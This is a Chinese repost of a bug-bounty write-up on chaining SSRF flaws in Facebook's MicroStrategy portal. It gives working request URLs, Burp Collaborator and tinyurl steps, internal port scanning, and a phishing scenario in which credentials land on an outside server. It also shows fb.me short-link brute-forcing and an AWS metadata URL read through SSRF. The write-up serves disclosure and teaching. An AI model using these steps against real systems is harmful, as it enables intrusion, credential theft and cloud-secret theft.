---
title: 【微信】我如何靠一个 Bug，从 Facebook 拿到 31500 美元
source: https://mp.weixin.qq.com/s/VMEOh0Id5gMDrTgWAVfZEg
source_host: mp.weixin.qq.com
clip_date: 2026-11-25T20:04:13+08:00
trace_id: c484c580-7879-4469-893d-c325f4bebf9a
content_hash: 625d816e20cec4773218bf17209e79cb59ec2cdec2c20aabca79cde626424255
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 30
  succeeded: 30
  failed_urls: []
notion_page_id: 42375244-d011-819f-985c-f88d74fde22e
ioc: null
---

**信息安全笔记** *2026年11月23日 17:36*

原作者：win3zz（Bipin Jitiya）

全文约 3400 字，阅读约 9 分钟

编者按这篇复盘在安全圈被引用过很多次。真正值钱的不是 31,500 美元这个数字，而是它把一条完整的路走给你看了：一个被判「无影响」的漏洞，怎么靠补证据、做串联，最后被认定为严重问题。如果你也收到过「这不是漏洞」的回复，这篇值得读完。

Facebook 是全球最大的社交网站，用的人最多，盯着它的人自然也最多。我一直想试试它的安全防线。

做子域名枚举的时候，我刷出了一个子域：https://m-nexus.thefacebook.com/

访问它，页面一跳，落到了…/servlet/mstrWebAdmin，就是下面这张图。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/0c54ef06eeeeddef.png)

访问子域，页面被甩到 /servlet/mstrWebAdmin

我随手搜了下mstrWebAdmin，才知道这是 MicroStrategy 那套工具搭出来的「商业智能门户」（Business Intelligence Portal）。一篇博客也印证了这点。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/5fee3280aee7f65b.png)

搜索 mstrWebAdmin：MicroStrategy 商业智能门户

翻 MicroStrategy 的官方配置文档，我发现有两个端点对外开着：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/bf54b806f892299a.png)

官方文档里两个可公开访问的端点

## 01

## 两个端点，一个不设防

再往下翻，有个细节值得记下来。门户本体…/servlet/mstrWeb默认开了 HTTP Basic 认证；可旁边那个…/servlet/taskProc什么认证都不要。

taskProc 靠taskId参数指定动作，做一些自定义的数据收集和内容生成。我拿 Intruder 把内置 task 撸了一遍——每个都会校验登录会话， 唯独 shortURL 例外。它处理短链接，偏偏不查会话。

说白了就是：谁都能在没登录的情况下，把这个服务用起来。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/aca7e83ecbe7e281.png)

Burp Intruder 枚举 taskId：只有 shortURL 不校验会话

## 02

## 答案藏在 400MB 源码里

我先把文档里提到的参数全 fuzz 了一轮，颗粒无收 😔。每次都是同一句报错：The source URL is not valid，状态码 500。

那就换个打法：把整套 Web 应用下载下来，直接读代码。安装包 400 多 MB，塞满脚本和 jar。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/9e9c762b3436ac3b.png)

下载下来的应用包，400MB 起步

jd-gui 一反编译，代码就到手了。目标很明确：那个不校验会话的 shortURL。翻了一阵，在某个 jar 里逮到了对应的 Java 类。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/5e7b84c9a652d1af.png)

jd-gui 反编译，定位到 ShortURLTask.class

看到代码才明白那句报错为什么每次都一样：

srcURL只认https://tinyurl.com/生成的链接，其余一律拒掉——它的活儿，就是从那个短链地址把数据读回来。

▸ 代码要点（原文此处为截图，这里按逻辑复述）

// shortURL task 的处理逻辑 srcURL ← 用户传入的参数 if (srcURL 不是以 "https://tinyurl.com/" 开头) return "The source URL is not valid" // 500 else 用 JSOUP 发 GET，抓回页面并解析

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/02a8350b685e8b3b.png)

ShortURLTask 里写死的白名单：ALLOW_DOMIN = tinyurl.com

## 03

## 那还等什么，开打 💥

下面这套步骤，就是我发给 Facebook 的原样：

1打开 Burp Suite，菜单里选 Burp Collaborator client，生成一个 payload，复制。

2浏览器打开 https://tinyurl.com/ ，把 payload 粘进去生成短链，再复制这条 tiny URL。

3把 tiny URL 塞进下面这个地址的 srcURL 参数，浏览器一访问：

https://m-nexus.thefacebook.com/servlet/taskProc? taskId=shortURL&taskEnv=xml& taskContentType=json&srcURL={YOUR_TINY_URL_HERE}

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/6c61b4d3e04d11ed.png)

Burp Collaborator 生成 payload

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/ca802ebcc43b2df0.png)

在 tinyurl.com 把 payload 转成短链

4\. Collaborator 立刻响了，来源 IP199.201.64.1。外部 SSRF，成立。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/9689b562d6fcdaca.png)

Collaborator 响了：请求来自 199.201.64.1

5\. 这个 IP 是 Facebook 的，whois 一查便知。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/750ccab2b2aa773e.png)

whois：这个 IP 属于 Facebook

6\. 换成无效内网 IP（比如 123.10.123.10）生成短链，再打一次——服务器毫无响应。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/bd81325d0237ab0e.png)

无效内网 IP：没有任何响应

7\. 换成有效内网 IP（127.0.0.1:8080）——这回弹出 HTTP Basic 认证框。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/140002888ab7883b.png)

有效内网 IP：要求 HTTP Basic 认证

有对比就有信息量。防火墙后面藏着什么，可以这么一点点摸出来。

我兴冲冲地报了上去，结果被驳回——他们认为这不算安全问题。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/cec413e8794ff38c.png)

第一次提交：被判「不是安全漏洞」

FACEBOOK 回复

「这不是一个安全漏洞。」（小编按：原文此处为工单截图）

## 04

## 被驳回了，那就继续挖 ⛏️

证据不够，只能自己补。file://、dict://、ftp://、gopher:// 都试过，云主机的 metadata 也想拉，全都没成。

磨了一阵，终于凑出几个真能说明危害的场景。这些是我连同复现步骤一起发过去的。

场景一反射型 XSS

原文以配图演示：把可控内容注入回显页，借这个可信域名把脚本跑起来。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/24b22224de02e40f.png)

场景一：反射型 XSS

场景二拿 SSRF 做钓鱼

STEP 1. 先仿一个 Facebook 登录页，用来偷账号密码，外观和真门户一模一样。挂在私人服务器上：http://ahmedabadexpress.co.in/

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/be74dfacd3d94b24.png)

仿出来的 Facebook 登录页

STEP 2. 打开 https://tinyurl.com/ ，给这个钓鱼页（http://ahmedabadexpress.co.in/fb/login/fb.html）生成短链，复制。

STEP 3. 把 tiny URL 塞进下面地址的 srcURL，然后把这条链接发给受害者：

https://m-nexus.thefacebook.com/servlet/taskProc? taskId=shortURL&taskEnv=xml& taskContentType=json&srcURL={YOUR_TINY_URL_HERE}

受害者一输账号密码，凭据就落进 http://ahmedabadexpress.co.in/fb/login/usernames.txt，页面再把人送回真正的登录页。你注意看域名——m-nexus.thefacebook.com，怎么看都像官方的。

STEP 4. 打开 http://ahmedabadexpress.co.in/fb/login/usernames.txt ，凭据到手。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e92215498bfb341e.png)

受害者输入的账号密码落进 txt

同样的套路，也能把人导向挂马的页面。

场景三摸内网（没暴露在公网的服务）

防火墙后面的内网，我能扫。Burp Intruder 一口气发了 10000 多个请求，找开放端口，以及端口上跑着什么。

扫完发现 10303 端口上跑着一个叫LightRay的东西。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e8ce13e99f95772e.png)

10303 端口上跑着的 LightRay

还没等我细看，Facebook 安全团队已经把洞补了。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f3489b7730e43f35.png)

$1,000 到账：Facebook 的赏金通知

## 05

## 就这样结束了？故事才开头 😉

到这里我确认了一件事：MicroStrategy Web SDK 就跑在 Facebook 的生产机上。它是 Java 写的，而我最爱在 Java 里找 bug。于是把 SDK 的 jar 一个个反编译，边读边在自己的服务器上搭了一套环境——看到可疑的地方，立刻上去验。👨💻

磨了 26 天，终于抓到一条有意思的线索。💡

com.microstrategy.web.app.task.WikiScrapperTask这个类里，字符串str1直接由我们传进去的参数初始化。它先判断这串东西是不是以 http://（或 https://）开头，是的话，就调webScrapper。

而 webScrapper 干的事，是用 JSOUP 朝那个 URL 在内部发一个 GET，把页面抓回来解析。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/130b877c6f52bc6e.png)

WikiScrapperTask：str1 可控，webScrapper 发 GET

BOOM！！又是一个 SSRF。🕺

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/298002b042c45965.png)

第二次撞上 SSRF，这次是盲打

可惜是盲打——我没法证明它真能把内部 GET 请求发出去。但 SDK 源码就躺在 m-nexus 那台机器上，我据此判断，这是内部 SSRF。

问题是：光凭这个，既摸不到内网结构，也拿不到任何敏感数据。这种报告递上去，多半还是一句「无影响」。😔

那怎么办？那一刻，我脑子里是空的。干脆先放下，回头去啃 facebook.com 主站。

## 06

## 几个月后：fb.me 的意外 ⌛

在主站上，我又碰上一个：短链接服务可能把服务器的信息漏出去。

URL 短链接（URL shortening）是万维网上的一种技术：把统一资源定位符（URL）变得很短，同时仍然指向所需的页面。——维基百科

Facebook 自己有短链服务https://fb.me/，内部员工和普通用户都在用。我发现它只干一件事：拿 HTTP Location 头把人 302 到长链接。而且——没有速率限制。

没有限速，就意味着可以字典爆破。我拿约 2000 个词打这个 Web 服务器，一条条看响应。Intruder 里抓到一批短链，它们先跳内部系统，内部系统再把人送回 facebook.com。

大致长这样：

https://fb.me/xyz == 301 ==> https://our.intern.facebook.com/intern/{内部数据} == 302 ==> https://www.facebook.com/intern/{内部数据} == 404 Not Found

关键在于：其中一些指向内部的短链，是 Facebook 员工自己生成的，里面可能带着敏感信息。比如：

https://our.intern.facebook.com/intern/webmanager?domain=xyz.com&user=admin&token=YXV0aGVudGljYXRpb24gdG9rZW4g

抓一下 https://fb.me/err 的响应包，logs 目录的完整内部路径就摆在那儿：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/def37969f83f06ee.png)

响应里直接吐出 logs 目录等内部路径

字典加 Intruder，这类信息还能挖出更多。我顺手写了个 Python 脚本，把流程自动化。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e61b26e87811f2a0.png)

自己写的脚本：批量跑 fb.me 短链

截图只放两张——按 Facebook 的政策，其余不能公开。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e4791677a100c22d.png)

抓到的内部 URL 与查询参数（余下因 Facebook 政策未公开）

漏的是什么？是内部的 HTTP GET 查询。全程不用登录，就能看到：logs 目录路径、其他文件路径、内部系统取数用的查询语句、内网 IP、内部 ID、配置信息、私有文档……

顺着这些，攻击者能把系统里合法的内部 URL 一条条枚举出来。

## 07

## 串起来 ⛓️

到这儿，手里有两个洞：

1盲 SSRF——能朝内部、外部系统发 GET

2服务器信息泄露——logs 路径、文件路径、内部查询、内网 IP、内部 ID

我搭了个场景，说明这两样凑一起能干什么：路径穿越、SSRF，都能落地。道理很直白——攻击者一旦摸清内网 IP，往里打就容易多了。

两个 PoC 一起交上去，回复说：

FACEBOOK 回复

盲 SSRF 那个洞已经修了，wikiScrapper 这个 task 现在访问不到，也不再注册。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/8796d390153d01ba.png)

两个 PoC 一起交，回信说洞已经修了

……这有点不讲道理吧。😥

我回了一封：

作者追问

「能不能按我上一封邮件说的，让我实测一下？」（原文此处为邮件截图）

回信只有一句：

hard luck 😟

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/2ad51d2a09971c54.png)

（运气不好）

随后被判定为「无效报告」

## 08

## 又一次反转 😎

又啃了几天，我翻出第三个盲 SSRF。

还是 MicroStrategy Web SDK 的源码。com.microstrategy.web.app.utils.usher这个类里，validateServerURL负责处理serverURL参数，而它内部就会朝传入的 URL 发一个 GET。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/ff09e17a35df204f.png)

usher 类：validateServerURL 直接发起 GET

我把 serverURL 换成 Burp Collaborator 的地址，请求发出去。

Collaborator 立刻响，来源 IP 还是199.201.64.1。SSRF，坐实。

我又问了一次：能不能按我说的去实测。这次回复是——bug 已复现，正在做补丁，赏金怎么定稍后告知。

几天后，等来了结果：

REWARDED BY FACEBOOK

Facebook 给了赏金

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d4d6f562f6a147b2.png)

赏金决定：最终认定

Wow！🤩🤩🤩🤩🤩

## 09

## 顺手把 MicroStrategy 也收了

接着我想看看 MicroStrategy 的演示门户有没有同样的问题——有。

顺着 AWS metadata API，我还从他们的服务器上拿到了一些相当有价值的东西。

http://169.254.169.254/latest/user-data

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/9c426b0727433742.png)

AWS metadata 里读到的 user-data

通过 SSRF 调 metadata API 拿到的响应（原文为配图）

报告递过去，回复是：

ACKNOWLEDGED & REWARDED

MicroStrategy 确认了，也给了赏金

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/626b4ec32a6e016e.png)

MicroStrategy 的确认信与 $500

## 10

## 说在最后

洞现在都修了。这篇写得有点长，但我想让你看到的其实是一件事：代码审计、枚举、写脚本，这几样能力凑到一起，能挖出什么样的严重漏洞。

第一次在 Facebook 上撞见这个洞时，我试过往 RCE 上打，可惜他们防护做得扎实。

不过这一路下来，我一共拿到31,500 美元（$1,000 + $30,000 + $500）。💰

| 赏金构成 | 金额  |
| --- | --- |
| 第一笔 | $1,000 |
| 第二笔（Facebook 最终认定） | $30,000 |
| 第三笔（MicroStrategy） | $500 |
| 合计  | $31,500 |

注：原文只给出三笔金额及其总和，没逐笔说明对应哪个节点，上表按原文数字列出。

希望你喜欢这个故事。文中难免有疏漏，还请指正。

感谢阅读。继续学习，注意安全。😇

—— win3zz（Bipin Jitiya）

📌 复盘：这条路为什么能走通

① 枚举摸到 m-nexus，认出 MicroStrategy 商业智能门户。

② 读码400MB 安装包反编译，找到 shortURL 对 srcURL 的白名单。

③ 被拒「盲 SSRF 无影响」——绝大多数报告就停在这一步。

④ 补证据钓鱼、XSS、内网端口扫描，把危害演给人看。

⑤ 26 天后WikiScrapperTask 里翻出第二个 SSRF，还是盲打。

⑥ 几个月后fb.me 泄露内部路径和查询参数，跟盲 SSRF 串成完整攻击链。

⑦ 被抢跑之后修复赶在奖励前面（hard luck），但 usher 类里又中一个，最终拿到 $30,000。

原文：How I made $31,500 by submitting a bug to Facebook · Medium · @win3zz
